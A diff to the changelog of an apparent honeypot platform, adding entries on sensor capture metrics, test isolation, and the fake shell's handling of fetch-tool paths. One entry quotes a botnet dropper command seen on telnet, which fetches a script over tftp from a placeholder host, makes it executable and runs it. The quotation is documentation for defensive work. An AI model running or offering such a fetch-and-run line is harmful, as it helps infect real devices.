@@ -27,6 +27,19 @@
   lines as a numbered list in place of the fused text; events recorded before the key existed, and
   single-line commands, show what they showed. No migration: it is an additive metadata key on new
   events only.
+- **Sensor capture counters reach `/metrics`** - the capture hand-off counters and the
+  capture-memory budget each sensor kept only in its own process (queue drops, spool refusals,
+  truncated and refused captures, budget current, high-water and refusals) are now written by the
+  six capturing sensors (ssh, telnet, adb, ftp, mqtt, tftp) as a `sensor_stats` line to their
+  event log every 60 s and once more, with `final` set, at shutdown. It is not an event: its
+  `source_ip` is the sentinel `0.0.0.0`, intake takes it out before conversion and keeps the latest
+  per sensor in a new `sensor_stats` table (`fleet` migration `0002`, additive), so it never
+  reaches the ledger, a score, the feed, a campaign or a vendor submission. Intake refuses, as a
+  rejected line with a WARN, a `sensor_stats` line from any other source, with other than the
+  fixed field set, with a value over 2^53, or naming a sensor other than the log's label. The
+  console publishes the values on `/metrics` as `propolis_sensor_capture_*` series labelled by
+  sensor, with `propolis_sensor_stats_age_seconds`, `_stale` (past 180 s) and `_final`, so a dead
+  sensor reads as stale, not as zeros. No new setting.
 - **The evidence timeline shows what the fetcher did with each download** - a
   `honeypot_file_download` event now carries a line under its URL: `fetched` with the sample
   hash linked to its page, `refused` (the SSRF guard or hop limit) or `failed` with the recorded
@@ -145,6 +158,31 @@
 
 ### Fixed
 
+- **Two flaky tests are deterministic** - the review fetcher's
+  `a_claim_hides_its_rows_until_recorded_or_the_lease_lapses` failed about one run in three
+  because `claim_candidates` is global (it syncs every download event and selects across all of
+  `fetch_attempt`) and the test shared a persistent database with other suites, so a leftover
+  `pending` row or another crate's download event was claimed ahead of its own fixture; its
+  hand-written reset covered only `fetch8*.example` hosts and `203.0.113.*` events. Every
+  database test in the review crate (the fetcher orchestration tests and the allowlist,
+  gatekeeper, queue, submit, fetcher-schema, VirusTotal-filter and CLI integration tests, 72 in
+  all) now runs on its own `#[sqlx::test]` database, so no partial reset is left to be
+  incomplete. The sensor-dns `the_global_budget_limits_many_networks_together` assumed 200 ms
+  reply timeouts and a refill window narrow enough for `3..=4` answers, so a stalled host saw
+  more refills or late replies; it now counts what the server did (answered events plus
+  suppressed summaries, which must total the six sent) and bounds the answers by the burst plus
+  one reply per second actually elapsed. No behaviour change in either crate.
+- **A path to a file is no longer taken for the fetch tool of the same name** - observed
+  2026-10-09 on telnet: a bot probing for fetch tools ran `/bin/busybox tftp -g HOST -r tftp.sh
+  -l - > tftp;chmod 777 tftp;./tftp`, and the final `./tftp`, the empty file the line had just
+  written, was recorded as a second `honeypot_file_download` with the raw command and no `url`.
+  The detector and the executor now share one decision (`FakeShell::exec_target`): a command
+  token with a slash is `wget`, `curl`, `tftp`, `ftpget` or `busybox` only where the path is an
+  executable the box ships (`/usr/bin/wget`, `/bin/wget` through the usrmerge link, `bin/wget`
+  from `/usr`); a file the session wrote is that file, and a path to nothing is `No such file or
+  directory` (`not found` under dash and mksh) instead of silently running the applet of that
+  name. A saved copy of busybox named `busybox*` still fetches. Wording unchanged, checked
+  against Ubuntu 22.04.
 - **Most active on the dashboard no longer runs off a phone screen** - at 390 px the table's last
   two columns (what it did, last seen) were clipped. Below 640 px each row is now a card, the
   same pattern the queue, campaigns and samples lists use: address and events on top, the 24-hour
